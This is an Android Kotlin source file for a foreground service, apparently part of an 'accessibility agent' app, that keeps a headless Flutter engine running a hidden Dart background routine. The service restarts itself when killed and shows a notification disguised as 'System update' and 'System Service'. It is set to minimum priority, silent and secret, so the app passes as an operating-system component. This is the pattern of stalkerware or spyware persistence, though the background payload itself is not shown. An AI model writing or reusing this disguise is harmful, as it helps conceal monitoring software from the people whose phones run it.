package com.example.cyber_accessibility_agent

import android.app.*
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import io.flutter.embedding.engine.FlutterEngine
import io.flutter.embedding.engine.dart.DartExecutor
import io.flutter.embedding.engine.loader.FlutterLoader
import io.flutter.plugins.GeneratedPluginRegistrant
import java.util.concurrent.Executors
import java.util.concurrent.atomic.AtomicBoolean

class AgentService : Service() {

    companion object {
        const val CHANNEL_ID = "sys_core"
        const val NOTIF_ID = 1001
        const val ACTION_START = "agent_start"
    }

    private val TAG = "AgentService"

    private var flutterEngine: FlutterEngine? = null
    private val executor = Executors.newSingleThreadExecutor()

    // 🔐 Guards (VERY IMPORTANT)
    private val engineStarting = AtomicBoolean(false)
    private val engineStarted = AtomicBoolean(false)

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        startForeground(NOTIF_ID, buildNotification())
        Log.i(TAG, "AgentService created & foregrounded")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val action = intent?.action

        if (action == null || action == ACTION_START) {
            startFlutterIfNeeded()
        }

        // If Android kills service, recreate + call onStartCommand again
        return START_STICKY
    }

    private fun startFlutterIfNeeded() {
        if (engineStarted.get() || engineStarting.get()) {
            Log.i(TAG, "FlutterEngine already running or starting, skipping")
            return
        }

        engineStarting.set(true)

        executor.execute {
            try {
                initFlutter()
                engineStarted.set(true)
                Log.i(TAG, "FlutterEngine fully started")
            } catch (e: Exception) {
                Log.e(TAG, "FlutterEngine failed to start", e)
                engineStarted.set(false)
            } finally {
                engineStarting.set(false)
            }
        }
    }

    private fun initFlutter() {
        val loader = FlutterLoader()
        loader.startInitialization(applicationContext)
        loader.ensureInitializationComplete(applicationContext, null)

        val engine = FlutterEngine(applicationContext)

        // Required for MethodChannels, plugins, shared prefs, etc
        GeneratedPluginRegistrant.registerWith(engine)

        val entrypoint = DartExecutor.DartEntrypoint(
            loader.findAppBundlePath(),
            "backgroundMain"
        )

        engine.dartExecutor.executeDartEntrypoint(entrypoint)

        flutterEngine = engine
    }

    override fun onDestroy() {
        Log.w(TAG, "AgentService destroyed")

        try {
            flutterEngine?.destroy()
        } catch (e: Exception) {
            Log.w(TAG, "Error destroying FlutterEngine", e)
        }

        flutterEngine = null
        engineStarted.set(false)
        engineStarting.set(false)

        executor.shutdownNow()
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    // ---------- Notification ----------

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "System Service",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                setSound(null, null)
                enableVibration(false)
                enableLights(false)
                setShowBadge(false)
                lockscreenVisibility = Notification.VISIBILITY_SECRET
            }

            val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            try {
                nm.createNotificationChannel(channel)
            } catch (e: Exception) {
                Log.w(TAG, "createNotificationChannel failed", e)
            }
        }
    }

    private fun buildNotification(): Notification {
        val iconRes = resources.getIdentifier("ic_sys_dot", "drawable", packageName)
        val icon = if (iconRes != 0) iconRes else R.mipmap.ic_launcher

        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setSmallIcon(icon)
            .setContentTitle("System update")
            .setContentText("System services running")
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setCategory(Notification.CATEGORY_SERVICE)
            .setOngoing(true)
            .setSilent(true)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setShowWhen(false)
            .build()
    }
}